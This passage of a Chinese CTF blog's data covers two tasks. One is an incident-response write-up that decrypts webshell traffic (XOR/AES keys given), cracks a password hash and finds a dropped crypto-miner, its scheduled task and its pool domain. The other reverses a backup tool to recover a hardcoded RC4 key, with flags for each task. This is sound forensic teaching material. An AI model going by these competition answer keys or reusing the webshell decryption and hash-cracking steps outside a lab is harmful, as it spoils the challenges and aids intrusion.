\u4e0a\u4f20\u7684\u6076\u610f\u6587\u4ef6\u662f\u4ec0\u4e48? \u793a\u4f8b: malware.exe\\n\\n\u5df2\u7ecf\u77e5\u9053 Webshell \u7684\u52a0\u89e3\u5bc6\u5b9e\u73b0\u4e4b\u540e\uff0c\u5c31\u53ef\u4ee5\u7f16\u5199\u5904\u7406\u6d41\u7a0b\\n\\n```plaintext\\nFrom_Base64(\'A-Za-z0-9+/=\',true,false)\\nXOR({\'option\':\'UTF8\',\'string\':\'2ca9b43c1b8ef8c8\'},\'Standard\',false)\\nAES_Decrypt({\'option\':\'UTF8\',\'string\':\'b42e327feb5d923b\'},{\'option\':\'Hex\',\'string\':\'\'},\'ECB/NoPadding\',\'Raw\',\'Raw\',{\'option\':\'Hex\',\'string\':\'\'},{\'option\':\'Hex\',\'string\':\'\'})\\nZlib_Inflate(0,0,\'Adaptive\',false,false)\\n```\\n\\n\u9010\u4e2a\u89e3\u5bc6\u670d\u52a1\u7aef\u7684\u8fd4\u56de\u5305\uff0c\u53ef\u4ee5\u53d1\u73b0\\n\\n![img](img/image_20241152-235213.png)\\n\\n![img](img/image_20241152-235252.png)\\n\\n\u5c06\u5176\u4e2d\u7684 `msg` \u6570\u636e\u63d0\u53d6\u51fa\u6765\\n\\n![img](img/image_20241153-235314.png)\\n\\n\u5c06 Sqlite \u6570\u636e\u5e93\u6587\u4ef6\u5bfc\u51fa\uff0c\u53d1\u73b0\\n\\n![img](img/image_20241154-235400.png)\\n\\n\u67e5\u8be2 MD5 \u5f69\u8679\u8868\uff0c\u5f97\u5230\\n\\n```plaintext\\n6fb5d7cd1041571a52c0b23707239a08 -> vipvip123\\n```\\n\\n\u5e76\u4e14\u7ee7\u7eed\u8ffd\u8e2a\u6d41\u91cf\uff0c\u89e3\u5bc6\u8bf7\u6c42\u5305\uff0c\u53ef\u4ee5\u53d1\u73b0\\n\\n![img](img/image_20241100-000033.png)\\n\\n\u5bf9 Java Class \u8fdb\u884c\u53cd\u7f16\u8bd1\\n\\n![img](img/image_20241101-000113.png)\\n\\n\u5373\u53ef\u5f97\u5230\u7b54\u6848\\n\\n```flag\\n1. hhcloud:vipvip123\\n2. e.ps1\\n```\\n\\n### task8\\n\\n> 1. \u6076\u610f\u811a\u672c\u8bbe\u7f6e\u7684\u8ba1\u5212\u4efb\u52a1\u53eb\u4ec0\u4e48? \u793a\u4f8b: Miner\\n>\\n> 2. \u6316\u77ff\u7a0b\u5e8f\u843d\u5730\u7684\u6587\u4ef6\u662f\u4ec0\u4e48\uff1f \u793a\u4f8b: miner.exe\\n\\n\u7ee7\u7eed\u8ddf\u8fdb\u6d41\u91cf\\n\\n![img](img/image_20241102-000249.png)\\n\\n\u89e3\u5bc6\u5f97\u5230\\n\\n```json\\n{\\n    \\"msg\\": \\"\u6210\u529f: \u6210\u529f\u521b\u5efa\u8ba1\u5212\u4efb\u52a1 \\\\\\"Update service for Windows Service\\\\\\"\u3002\\\\r\\\\n\\",\\n    \\"status\\": \\"c3VjY2Vzcw==\\"\\n}\\n```\\n\\n\u5bf9\u6240\u6709\u6d41\u91cf\u7684\u8bf7\u6c42\u5305\u8fdb\u884c\u89e3\u5bc6\uff0c\u8fd8\u53ef\u4ee5\u627e\u5230\u653b\u51fb\u8005\u90e8\u7f72\u7684\u6587\u4ef6 `sys_update.exe`\\n\\n```flag\\n1. Update service for Windows Service\\n2. sys_update.exe\\n```\\n\\n### task9\\n\\n> 1. \u8be5\u6316\u77ff\u7a0b\u5e8f\u56de\u8fde\u7684\u77ff\u6c60\u57df\u540d\u662f\u4ec0\u4e48? \u793a\u4f8b: `www.baidu.com`\\n\\n\u653b\u51fb\u8005\u76f4\u63a5\u8bf7\u6c42\u4e86\u6316\u77ff\u7a0b\u5e8f\u7684\u914d\u7f6e\u6587\u4ef6\\n\\n![img](img/image_20241107-000706.png)\\n\\n\u5728\u5176\u4e2d\u627e\u5230\u4ee5\u4e0b\u8bb0\u5f55\\n\\n```plaintext\\n\\"url\\": \\"auto.skypool.xyz:4444\\"\\n```\\n\\n\u5373\u53ef\u5f97\u5230\u7b54\u6848\\n\\n```flag\\n1. auto.skypool.xyz\\n```"},{"id":"2024sxb Scenario-Race Data-Backup","metadata":{"permalink":"/Target-Machines-WriteUp/blog/2024sxb Scenario-Race Data-Backup","editUrl":"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/blog/2024-11-09-2024sxb-Scenario-Race-Data-Backup/index.md","source":"@site/blog/2024-11-09-2024sxb-Scenario-Race-Data-Backup/index.md","title":"2024 \u6570\u4fe1\u676f - \u573a\u666f\u8d5b - \u6570\u636e\u5907\u4efd","description":"2024 \u6570\u4fe1\u676f - \u6570\u636e\u5b89\u5168\u7efc\u5408\u573a\u666f\u8d5b - \u6570\u636e\u5907\u4efd \u9898\u76ee\u5206\u6790","date":"2024-11-09T00:00:00.000Z","tags":[{"inline":true,"label":"CTF","permalink":"/Target-Machines-WriteUp/blog/tags/ctf"},{"inline":true,"label":"Incident-Response","permalink":"/Target-Machines-WriteUp/blog/tags/incident-response"}],"readingTime":18.89,"hasTruncateMarker":true,"authors":[{"name":"\u9648\u6a58mo","title":"Why So Serious?","url":"https://randark.site","imageURL":"https://raw.githubusercontent.com/TryHackMyOffsecBox/Target-Machines-WriteUp/refs/heads/main/static/img/users/IMG_8925.PNG","key":"Randark","page":null}],"frontMatter":{"slug":"2024sxb Scenario-Race Data-Backup","title":"2024 \u6570\u4fe1\u676f - \u573a\u666f\u8d5b - \u6570\u636e\u5907\u4efd","authors":"Randark","tags":["CTF","Incident-Response"]},"unlisted":false,"prevItem":{"title":"2024 \u5f3a\u7f51\u676f Master of DFIR","permalink":"/Target-Machines-WriteUp/blog/2024qwbs8 Master of DFIR"},"nextItem":{"title":"\u6e17\u900f\u6d4b\u8bd5\u5e38\u7528 poc","permalink":"/Target-Machines-WriteUp/blog/2024/01/01/Commonly Used PoCs in Penetration Testing"}},"content":"2024 \u6570\u4fe1\u676f - \u6570\u636e\u5b89\u5168\u7efc\u5408\u573a\u666f\u8d5b - \u6570\u636e\u5907\u4efd \u9898\u76ee\u5206\u6790\\n\\n\x3c!-- truncate --\x3e\\n\\n\u9996\u5148\uff0c\u670d\u52a1\u5668\u7684\u73af\u5883\u6ca1\u6709\u4efb\u4f55\u4f5c\u7528\uff0c\u6838\u5fc3\u90fd\u5728\u670d\u52a1\u5668\u4e0a\u83b7\u53d6\u7684\u4e24\u4e2a\u6837\u672c\\n\\n```plaintext\\nmyback\\n202410311935.cbak\\n```\\n\\n\u9644\u4ef6\u53ef\u4ee5\u5728 [Release \u9644\u4ef6\u4e0b\u8f7d - Data-Backup.zip \xb7 CTF-Archives/2024-shuxincup](https://github.com/CTF-Archives/2024-shuxincup/releases/download/v0.1/Data-Backup.zip) \u83b7\u53d6\u5f97\u5230\\n\\n\u4e00\u4e2a\u662f\u5907\u4efd\u5de5\u5177\uff0c\u4e00\u4e2a\u662f\u6267\u884c\u5907\u4efd\u4e4b\u540e\u5f97\u5230\u7684\u88ab\u7834\u574f\u7684\u5907\u4efd\u6587\u4ef6\\n\\n\u9996\u5148\uff0c\u5148\u5c1d\u8bd5\u6267\u884c\u4e00\u4e0b\u5907\u4efd\u5de5\u5177\\n\\n![img](img/image_20241116-211626.png)\\n\\n```bash\\n\u250c\u2500\u2500(randark \u327f kali)-[~/tmp/2024sxb-1]\\n\u2514\u2500$ ./myback\\nMenu:\\n1. Backup File\\n2. Restore Files\\n3. Print Info\\n4. Exit\\n```\\n\\n\u90a3\u4e48\uff0c\u6839\u636e\u6bd4\u8d5b\u65f6\u7684\u9898\u76ee\u5148\u5b8c\u6210\u4e00\u4e0b\u9898\u76ee\\n\\n## 1. \u7248\u672c\u4fe1\u606f\\n\\n> \u8bf7\u9009\u624b\u5206\u6790\u5907\u4efd\u6062\u590d\u7cfb\u7edf\u4e2d\u7684\u5907\u4efd\u5de5\u5177 myback \u7a0b\u5e8f\uff0c\u83b7\u53d6\u5907\u4efd\u5de5\u5177\u7684\u7248\u672c\u4fe1\u606f\u3002\\n>\\n> \u7248\u672c\u4fe1\u606f\u4e3a\u4e00\u4e32\u7c7b\u4f3c `***.***.***` \u7684\u5b57\u7b26\u4e32\uff0c\u6ce8\u610f\u661f\u53f7\u4e0d\u5177\u6709\u5360\u4f4d\u610f\u4e49\uff0c\u4e0d\u4ee3\u8868\u5177\u4f53\u7684\u5b57\u7b26\u4e32\u957f\u5ea6\u3002\\n>\\n> \u3010\u7b54\u6848\u6807\u51c6\u3011\u4f8b\uff1a\u82e5\u83b7\u53d6\u7684\u7248\u672c\u4fe1\u606f\u4e3a\uff1a123.456.789\uff0c\u5219\u63d0\u4ea4\u7684 \u6848\u4e3a\uff1a123.456.789\u3002\\n\\n\u7b2c\u4e00\u79cd\u505a\u6cd5\uff0c\u53ef\u4ee5\u76f4\u63a5\u6267\u884c\u7a0b\u5e8f\u6765\u83b7\u5f97\\n\\n```bash\\n\u250c\u2500\u2500(randark \u327f kali)-[~/tmp/2024sxb-1]\\n\u2514\u2500$ ./myback\\nMenu:\\n1. Backup File\\n2. Restore Files\\n3. Print Info\\n4. Exit\\nEnter your choice: 3\\nBcakup_programe version:3.85.4h6\\nThis program is used for backing up and restoring files.\\nChoose 1 to back up files in the specified directory to the current program directory and output a cbak file.\\nChoose 2 to restore the specified backup file to the current program directory.\\n```\\n\\n\u7b2c\u4e8c\u79cd\u65b9\u6cd5\uff0c\u7528 IDA \u76f4\u63a5\u9006\u5411\u5206\u6790\\n\\n```c\\nint __fastcall main(int argc, const char **argv, const char **envp)\\n{\\n    int choice; // [rsp+14h] [rbp-Ch] BYREF\\n    unsigned __int64 v5; // [rsp+18h] [rbp-8h]\\n\\n    v5 = __readfsqword(0x28u);\\n    puts(\\"Menu:\\");\\n    puts(\\"1. Backup File\\");\\n    puts(\\"2. Restore Files\\");\\n    puts(\\"3. Print Info\\");\\n    puts(\\"4. Exit\\");\\n    printf(\\"Enter your choice:\\");\\n    __isoc99_scanf(\\"%d\\", &choice);\\n    if (choice == 4)\\n    {\\n        puts(\\"Exiting program.\\");\\n        exit(0);\\n    }\\n    if (choice> 4 )\\n        goto LABEL_11;\\n    switch (choice)\\n    {\\n        case 3:\\n            print_info();\\n            break;\\n        case 1:\\n            puts(\\"Please enter the path of the directory to be backed up:\\");\\n            __isoc99_scanf(\\"%s\\", backup_file_dir);\\n            backup_file(backup_file_dir);\\n            break;\\n        case 2:\\n            puts(\\"Please enter the backup file name to be restored:\\");\\n            __isoc99_scanf(\\"%s\\", restore_file);\\n            restore_files(restore_file);\\n            break;\\n        default:\\nLABEL_11:\\n        puts(\\"Invalid choice. Please try again.\\");\\n        return 0;\\n    }\\n    return 0;\\n}\\n```\\n\\n\u4e00\u4e2a\u7b80\u5355\u7684\u83dc\u5355\u903b\u8f91\uff0c\u8ddf\u8fdb `print_info()` \u51fd\u6570\\n\\n```c\\nvoid __cdecl print_info()\\n{\\n    printf(\\"Bcakup_programe version:%s\\\\n\\", \\"3.85.4h6\\");\\n    puts(\\"This program is used for backing up and restoring files.\\");\\n    puts(\\"Choose 1 to back up files in the specified directory to the current program directory and output a cbak file.\\");\\n    puts(\\"Choose 2 to restore the specified backup file to the current program directory.\\");\\n}\\n```\\n\\n\u540c\u6837\u53ef\u4ee5\u5f97\u5230\u7b54\u6848\\n\\n```flag\\n3.85.4h6\\n```\\n\\n## 2. \u89e3\u5bc6\u7684\u5bc6\u94a5\\n\\n> \u8bf7\u9009\u624b\u5206\u6790\u5907\u4efd\u6062\u590d\u7cfb\u7edf\u4e2d\u7684\u5907\u4efd\u6062\u590d\u5de5\u5177 myback \u4e2d\u7684\u5907\u4efd / \u6062\u590d\u903b\u8f91\uff0c\u627e\u5230\u7528\u4e8e\u89e3\u5bc6\u7684\u5bc6\u94a5\u3002\\n>\\n> \u3010\u7b54\u6848\u6807\u51c6\u3011\u4f8b\uff1a\u82e5\u627e\u5230\u7528\u4e8e\u89e3\u5bc6\u7684\u5bc6\u94a5\u4e3a\u5b57\u7b26\u4e32 123456\u3002\u5219\u63d0\u4ea4\u6700\u7ec8 \u6848\u4e3a\uff1a123456\u3002\\n\\n\u9898\u76ee\u8981\u6c42\u7684\u662f\u89e3\u5bc6\u7b97\u6cd5\u7684\u5bc6\u94a5\uff0c\u90a3\u4e48\u89e3\u5bc6\u5e38\u89c1\u4e8e restore \u529f\u80fd\uff0c\u5373\u57fa\u4e8e\u83dc\u5355\u903b\u8f91\u8ddf\u8fdb `restore_files()` \u51fd\u6570\\n\\n```c\\nvoid __cdecl restore_files(const char *backup_file_path)\\n{\\n    __int64 v1; // rdx\\n    restore_files::FileInfo *v2; // rax\\n    __int64 v3; // rbx\\n    __int64 v4; // rbx\\n    int offset; // [rsp+10h] [rbp-E0h]\\n    int offseta; // [rsp+10h] [rbp-E0h]\\n    int file_info_count; // [rsp+14h] [rbp-DCh]\\n    int min_data_offset; // [rsp+18h] [rbp-D8h]\\n    int i; // [rsp+1Ch] [rbp-D4h]\\n    restore_files::FileInfo *file_info_list; // [rsp+20h] [rbp-D0h]\\n    FILE *backup_file; // [rsp+28h] [rbp-C8h]\\n    signed __int64 backup_file_size; // [rsp+30h] [rbp-C0h]\\n    unsigned __int8 *backup_file_buffer; // [rsp+38h] [rbp-B8h]\\n    restore_files::FileInfo *info_0; // [rsp+48h] [rbp-A8h]\\n    unsigned __int8 *encrypted_data; // [rsp+50h] [rbp-A0h]\\n    size_t data_length; // [rsp+58h] [rbp-98h]\\n    unsigned __int8 *decrypted_data; // [rsp+60h] [rbp-90h]\\n    FILE *output_file; // [rsp+68h] [rbp-88h]\\n    restore_files::FileInfo info; // [rsp+70h] [rbp-80h] BYREF\\n    char version[9]; // [rsp+97h] [rbp-59h] BYREF\\n    unsigned __int8 stored_md5_sum[16]; // [rsp+A0h] [rbp-50h] BYREF\\n    unsigned __int8 calculated_md5_sum[16]; // [rsp+B0h] [rbp-40h] BYREF\\n    char log_file_name[21]; // [rsp+C0h] [rbp-30h] BYREF\\n    unsigned __int64 v24; // [rsp+D8h] [rbp-18h]\\n\\n    v24 = __readfsqword(0x28u);\\n    backup_file = fopen(backup_file_path, \\"rb\\");\\n    if (backup_file)\\n    {\\n        fseek(backup_file, 0LL, 2);\\n        backup_file_size = ftell(backup_file);\\n        fseek(backup_file, 0LL, 0);\\n        backup_file_buffer = (unsigned __int8 *)malloc(backup_file_size);\\n        if (backup_file_buffer)\\n        {\\n            if (fread(backup_file_buffer, 1uLL, backup_file_size, backup_file) == backup_file_size )\\n            {\\n                fclose(backup_file);\\n                if (!memcmp(backup_file_buffer, \\"CBAK\\", 4uLL) )\\n                {\\n                    v1 = *(_QWORD *)(backup_file_buffer + 12);\\n                    *(_QWORD *)stored_md5_sum = *(_QWORD *)(backup_file_buffer + 4);\\n                    *(_QWORD *)&stored_md5_sum[8] = v1;\\n                    calculate_md5(backup_file_buffer + 20, backup_file_size - 20, calculated_md5_sum);\\n                    if (!memcmp(stored_md5_sum, calculated_md5_sum, 0x10uLL) )\\n                    {\\n                        memset(version, 0, sizeof(version));\\n                        *(_QWORD *)version = *(_QWORD *)(backup_file_buffer + 20);\\n                        memset(log_file_name, 0, sizeof(log_file_name));\\n                        memcpy(log_file_name, backup_file_buffer + 28, 0x14uLL);\\n                        offset = 48;\\n                        file_info_list = 0LL;\\n                        file_info_count = 0;\\n                        min_data_offset = backup_file_size;\\n                        while (offset < min_data_offset && backup_file_size>= offset + 32 )\\n                        {\\n                            memset(&info, 0, sizeof(info));\\n                            memcpy(&info, &backup_file_buffer[offset], 0x18uLL);\\n                            info.filename[24] = 0;\\n                            offseta = offset + 24;\\n                            info.file_size = *(_DWORD *)&backup_file_buffer[offseta];\\n                            offseta += 4;\\n                            info.file_offset = *(_DWORD *)&backup_file_buffer[offseta];\\n                            offset = offseta + 4;\\n                            if (min_data_offset> info.file_offset )\\n                                min_data_offset = info.file_offset;\\n                            file_info_list = (restore_files::FileInfo *)realloc(file_info_list, 36LL * (file_info_count + 1));\\n                            if (!file_info_list)\\n                            {\\n                                puts(&byte_425A);\\n                                free(backup_file_buffer);\\n                                return;\\n                            }\\n                            v2 = &file_info_list[file_info_count];\\n                            v3 = *(_QWORD *)&info.filename[8];\\n                            *(_QWORD *)v2->filename = *(_QWORD *)info.filename;\\n                            *(_QWORD *)&v2->filename[8] = v3;\\n                            v4 = *(_QWORD *)&info.filename[24];\\n                            *(_QWORD *)&v2->filename[16] = *(_QWORD *)&info.filename[16];\\n                            *(_QWORD *)&v2->filename[24] = v4;\\n                            v2->file_offset = info.file_offset;\\n                            ++file_info_count;\\n                        }\\n                        for (i = 0; i < file_info_count; ++i)\\n                        {\\n                            info_0 = &file_info_list[i];\\n                            if (info_0->filename[0] != 46 )\\n                            {\\n                                if (backup_file_size>= info_0->file_offset + info_0->file_size )\\n                                {\\n                                    encrypted_data = &backup_file_buffer[info_0->file_offset];\\n                                    data_length = info_0->file_size;\\n                                    decrypted_data = (unsigned __int8 *)malloc(data_length);\\n                                    if (decrypted_data)\\n                                    {\\n                                        memcpy(decrypted_data, encrypted_data, data_length);\\n                                        // highlight-next-line\\n                                        rc4_encrypt(\\"30048-0bea264-c01c6ea3-e5047d488\\", 32, decrypted_data, data_length);\\n                                        output_file = fopen(info_0->filename, \\"wb\\");\\n                                        if (output_file)\\n                                        {\\n                                            fwrite(decrypted_data, 1uLL, data_length, output_file);\\n                                            fclose(output_file);\\n                                        }\\n                                        else\\n                                        {\\n                                            printf(&byte_430C, info_0);\\n                                        }\\n                                        free(decrypted_data);\\n                                    }\\n                                    else\\n                                    {\\n                                        printf(&byte_42E8, info_0);\\n                                    }\\n                                }\\n                                else\\n                                {\\n                                    printf(&byte_42C0, info_0);\\n                                }\\n                            }\\n                        }\\n                        free(file_info_list);\\n                        free(backup_file_buffer);\\n                    }\\n                    else\\n                    {\\n                        puts(aMd5);\\n                        free(backup_file_buffer);\\n                    }\\n                }\\n                else\\n                {\\n                    puts(&byte_4289);\\n                    free(backup_file_buffer);\\n                }\\n            }\\n            else\\n            {\\n                puts(&byte_426D);\\n                free(backup_file_buffer);\\n                fclose(backup_file);\\n            }\\n        }\\n        else\\n        {\\n            puts(&byte_425A);\\n            fclose(backup_file);\\n        }\\n    }\\n    else\\n    {\\n        printf(&byte_423C, backup_file_path);\\n    }\\n}\\n```\\n\\n\u903b\u8f91\u6bd4\u8f83\u957f\uff0c\u4f46\u662f\u5728\u5176\u4e2d\u53ef\u4ee5\u770b\u5230\u8fd9\u4e00\u90e8\u5206\\n\\n```c\\nrc4_encrypt(\\"30048-0bea264-c01c6ea3-e5047d488\\", 32, decrypted_data, data_length);\\n```\\n\\n\u5f97\u76ca\u4e8e\u4e8c\u8fdb\u5236\u6587\u4ef6\u7684\u7b26\u53f7\u8868\u6ca1\u6709\u88ab\u53bb\u9664\uff0c\u53ef\u4ee5\u76f4\u63a5\u5f97\u77e5\u8fd9\u90e8\u5206\u5c31\u662f `RC4` \u6d41\u52a0\u5bc6\u7b97\u6cd5\\n\\n\u90a3\u4e48\u6839\u636e\u51fd\u6570\u7684\u5b9a\u4e49\\n\\n```c\\nvoid __cdecl rc4_encrypt(unsigned __int8 *key, int key_len, unsigned __int8 *data, int data_len)\\n```\\n\\n\u5c31\u53ef\u4ee5\u786e\u5b9a `RC4` \u7b97\u6cd5\u7684\u5bc6\u94a5\\n\\n```flag\\n30048-0bea264-c01c6ea3-e5047d488\\n```\\n\\n## 3. \u5b8c\u6574\u6027\u6821\u9a8c\u503c\\n\\n> \u8bf7\u9009\u624b\u5206\u6790\u5907\u4efd\u6062\u590d\u7cfb\u7edf\u4e2d\u7684\u5907\u4efd\u6062\u590d\u5de5\u5177 myback \u5728\u751f\u6210\u5907\u4efd\u6587\u4ef6\u7684\u903b\u8f91\uff0c\u53d1\u73b0\u5907\u4efd\u5de5\u5177\u4f7f\u7528\u4e00\u79cd\u5e38\u89c1\u7684\u65b9\u5f0f\u6765\u6821\u9a8c\u5907\u4efd\u6587\u4ef6\u7684\u5b8c\u6574\u6027\uff0c\u5e76\u4e14\u5c06\u751f\u6210\u7684\u5b8c\u6574\u6027\u6821\u9a8c\u5b57\u7b26\u4e32\u4fdd\u5b58\u5728\u4e86\u5907\u4efd\u6587\u4ef6\u4e2d\uff0c\u8bf7\u9009\u624b\u5206\u6790\u5907\u4efd\u6062\u590d\u5de5\u5177\uff0c\u627e\u5230\u5907\u4efd\u6587\u4ef6 202410311935.cbak \u5b8c\u6574\u6027\u6821\u9a8c\u503c\u3002\\n>\\n> \u3010\u7b54\u6848\u6807\u51c6\u3011\u4f8b\uff1a\u5b8c\u6574\u6027\u7684\u6821\u9a8c\u503c\u4f7f\u7528\u5b57\u7b26\u4e32\u7684\u5f62\u5f0f\u63d0\u4ea4\uff0c\u5982\u82e5\u5b8c\u6574\u6027\u6821\u9a8c\u503c\u7684 16 \u8fdb\u5236\u4e3a `3A 32 33 34 35 36 37 38 39 30`\uff0c\u5219\u5e94\u63d0\u4ea4\u7684 \u6848\u4e3a `3A323334353637383930`\uff0c\u7a7a\u683c\u4ec5\u4e3a\u663e\u793a\u6548\u679c\uff0c\u975e\u7b54\u6848\u4e2d\u5b57\u7b26\u3002 \u6848\u4e2d\u6240\u6709\u7684\u82f1\u6587\u5b57\u7b26\u5747\u4e3a\u5927\u5199\u5b57\u7b26\u3002\\n\\n\u5e38\u89c1\u7684\u6821\u9a8c\u503c\u7b97\u6cd5\uff0c\u5c31\u662f MD5\\n\\n\u5728\u53cd\u7f16\u8bd1\u7684\u51fd\u6570\u5217\u8868\u4e2d\uff0c\u5b9a\u4f4d\u5230 `calculate_md5()` \u51fd\u6570\\n\\n```c\\nvoid __cdecl calculate_md5(const unsigned __int8 *data, size_t length, unsigned __int8 *md5_sum)\\n{\\n    MD5_CTX ctx; // [rsp+20h] [rbp-70h] BYREF\\n    unsigned __int64 v5; // [rsp+88h] [rbp-8h]\\n\\n    v5 = __readfsqword(0x28u);\\n    MD5_Init(&ctx);\\n    MD5_Update(&ctx, data, length);\\n    MD5_Final(md5_sum, &ctx);\\n}\\n```\\n\\n\u90a3\u4e48\uff0c\u67e5\u770b `calculate_md5()` \u51fd\u6570\u7684\u4ea4\u53c9\u5f15\u7528\\n\\n![img](img/image_20241141-214129.png)\\n\\n\u53ef\u4ee5\u770b\u5230 `backup_file()` \u51fd\u6570\u548c `restore_files()` \u51fd\u6570\u90fd\u5f15\u7528\u4e86 `calculate_md5()` \u51fd\u6570\\n\\n\u4ee5 `backup_file()` \u51fd\u6570\u4e3a\u4f8b\uff0c\u8fdb\u884c\u5206\u6790\\n\\n```c\\nvoid __cdecl backup_file(const char *file_dir)\\n{\\n    __int64 v1; // rdx\\n    int file; // eax\\n    size_t v3; // rax\\n    char *v4; // rcx\\n    __int64 v5; // rdx\\n    __int64 v6; // rdx\\n    __int64 v7; // rdx\\n    int index; // [rsp+18h] [rbp-DE8h]\\n    int indexa; // [rsp+18h] [rbp-DE8h]\\n    int file_block_buf_offset; // [rsp+1Ch] [rbp-DE4h]\\n    int file_info_buf_offset; // [rsp+20h] [rbp-DE0h]\\n    int hidden_file_count; // [rsp+24h] [rbp-DDCh]\\n    int count; // [rsp+28h] [rbp-DD8h]\\n    int final_file_buf_offset; // [rsp+2Ch] [rbp-DD4h]\\n    __int64 current_file_size; // [rsp+38h] [rbp-DC8h]\\n    size_t i; // [rsp+40h] [rbp-DC0h]\\n    size_t i_0; // [rsp+48h] [rbp-DB8h]\\n    char *file_block_buf; // [rsp+50h] [rbp-DB0h]\\n    char *final_file_buffer; // [rsp+58h] [rbp-DA8h]\\n    char *file_buffer; // [rsp+60h] [rbp-DA0h]\\n    char *file_name_start; // [rsp+70h] [rbp-D90h]\\n    size_t file_buffer_length; // [rsp+78h] [rbp-D88h]\\n    char log_file_name[20]; // [rsp+80h] [rbp-D80h] BYREF\\n    char current_file_name[24]; // [rsp+A0h] [rbp-D60h] BYREF\\n    char current_file_info[32]; // [rsp+C0h] [rbp-D40h] BYREF\\n    char log_message[256]; // [rsp+E0h] [rbp-D20h] BYREF\\n    char file_info_buf[1024]; // [rsp+1E0h] [rbp-C20h] BYREF\\n    char file_name_buf[2048]; // [rsp+5E0h] [rbp-820h] BYREF\\n    unsigned __int64 v29; // [rsp+DE8h] [rbp-18h]\\n\\n    v29 = __readfsqword(0x28u);\\n    count = get_file_names_unix(file_dir, file_name_buf, 2048);\\n    file_block_buf = (char *)malloc(0xA00000uLL);\\n    final_file_buffer = (char *)malloc(0xA00000uLL);\\n    hidden_file_count = 0;\\n    index = 0;\\n    for (i = 0LL; i < count; ++i)\\n    {\\n        if (file_name_buf[index + 1 + strlen(file_dir)] == 46 )\\n        ++hidden_file_count;\\n        index += strlen(&file_name_buf[index]) + 1;\\n    }\\n    memcpy(final_file_buffer, \\"CBAK\\", 4uLL);\\n    memcpy(final_file_buffer + 20, \\"3.85.4h6\\", 8uLL);\\n    memset(log_file_name, 0, sizeof(log_file_name));\\n    memcpy(log_file_name, \\"backup.log\\", 0xAuLL);\\n    v1 = *(_QWORD *)&log_file_name[8];\\n    *(_QWORD *)(final_file_buffer + 28) = *(_QWORD *)log_file_name;\\n    *(_QWORD *)(final_file_buffer + 36) = v1;\\n    *((_DWORD *)final_file_buffer + 11) = *(_DWORD *)&log_file_name[16];\\n    indexa = 0;\\n    file_info_buf_offset = 0;\\n    file_block_buf_offset = 0;\\n    file_buffer = (char *)malloc(0xA00000uLL);\\n    for (i_0 = 0LL; i_0 < count; ++i_0)\\n    {\\n        if (file_name_buf[indexa + 1 + strlen(file_dir)] != 46 )\\n        {\\n            memset(current_file_name, 0, sizeof(current_file_name));\\n            file_name_start = &file_name_buf[indexa + 1 + strlen(file_dir)];\\n            strncpy(current_file_name, file_name_start, 0x17uLL);\\n            file = read_file(&file_name_buf[indexa], file_buffer);\\n            file_buffer_length = file;\\n            if (file)\\n            {\\n                rc4_encrypt(\\"30048-0bea264-c01c6ea3-e5047d488\\", 32, (unsigned __int8 *)file_buffer, file);\\n                LODWORD(current_file_size) = file_buffer_length;\\n                HIDWORD(current_file_size) = 32 * (count - hidden_file_count) + 48 + file_block_buf_offset;\\n                memcpy(&file_block_buf[file_block_buf_offset], file_buffer, file_buffer_length);\\n                file_block_buf_offset += file_buffer_length;\\n                memset(current_file_info, 0, sizeof(current_file_info));\\n                v3 = strlen(current_file_name);\\n                memcpy(current_file_info, current_file_name, v3);\\n                *(_QWORD *)&current_file_info[24] = current_file_size;\\n                v4 = &file_info_buf[file_info_buf_offset];\\n                v5 = *(_QWORD *)&current_file_info[8];\\n                *(_QWORD *)v4 = *(_QWORD *)current_file_info;\\n                *((_QWORD *)v4 + 1) = v5;\\n                v6 = *(_QWORD *)&current_file_info[24];\\n                *((_QWORD *)v4 + 2) = *(_QWORD *)&current_file_info[16];\\n                *((_QWORD *)v4 + 3) = v6;\\n                file_info_buf_offset += 32;\\n                printf(\\"Backup file:%s\\\\n\\", &file_name_buf[indexa]);\\n                sprintf(log_message, \\"Backup file: %s\\", &file_name_buf[indexa]);\\n                write_log(log_message);\\n            }\\n            else\\n            {\\n                printf(aCanNotReadFile, &file_name_buf[indexa]);\\n            }\\n        }\\n        indexa += strlen(&file_name_buf[indexa]) + 1;\\n    }\\n    free(file_buffer);\\n    memcpy(final_file_buffer + 48, file_info_buf, file_info_buf_offset);\\n    memcpy(&final_file_buffer[file_info_buf_offset + 48], file_block_buf, file_block_buf_offset);\\n    final_file_buf_offset = file_block_buf_offset + file_info_buf_offset + 48;\\n    //  highlight-start\\n    calculate_md5(\\n        (const unsigned __int8 *)final_file_buffer + 20,\\n        final_file_buf_offset - 20,\\n        (unsigned __int8 *)current_file_info);\\n    //  highlight-end\\n    v7 = *(_QWORD *)&current_file_info[8];\\n    *(_QWORD *)(final_file_buffer + 4) = *(_QWORD *)current_file_info;\\n    *(_QWORD *)(final_file_buffer + 12) = v7;\\n    getCurrentTime(current_file_name, 0xFuLL);\\n    strcpy(&current_file_name[strlen(current_file_name)], \\".cbak\\");\\n    sprintf(log_message, current_file_name);\\n    save_file(log_message, final_file_buffer, final_file_buf_offset);\\n    free(final_file_buffer);\\n    free(file_block_buf);\\n}\\n```\\n\\n\u6839\u636e `calculate_md5()` \u51fd\u6570\u7684\u5b9a\u4e49\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570 `data` \u6570\u636e\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570 `lenth` \u6570\u636e\u957f\u5ea6\uff0c\u7b2c\u4e09\u4e2a\u53c2\u6570 `md5_sum` \u4e3a MD5 \u8ba1\u7b97\u7ed3\u679c\\n\\n\u90a3\u4e48\u53ef\u4ee5\u77e5\u9053\\n\\n1. \u53d8\u91cf `current_file_info` \u4e3a\u539f\u59cb `calculate_md5()` \u51fd\u6570\u7684\u8ba1\u7b97\u7ed3\u679c\\n2. \u6267\u884c `v7 = *(_QWORD *)&current_file_info[8];` \u5c06 `current_file_info()` \u8ba1\u7b97\u7684\u7ed3\u679c\u53d6\u524d\u516b\u4f4d\u5b58\u5165 `v7`\\n3. \u6267\u884c `*(_QWORD *)(final_file_buffer + 4) = *(_QWORD *)current_file_info;` \u5c06 `current_file_info()` \u8ba1\u7b97\u7684\u7ed3\u679c\u4ece `final_file_buffer` \u7684 `offset = 4` \u4f4d\u7f6e\u5b58\u5165\\n\\n\u90a3\u4e48\u8bf4\u660e `cbak` \u6587\u4ef6\u7684 `offset = 4` \u4f4d\u7f6e\u5f00\u59cb\uff0c\u53d6 `16` 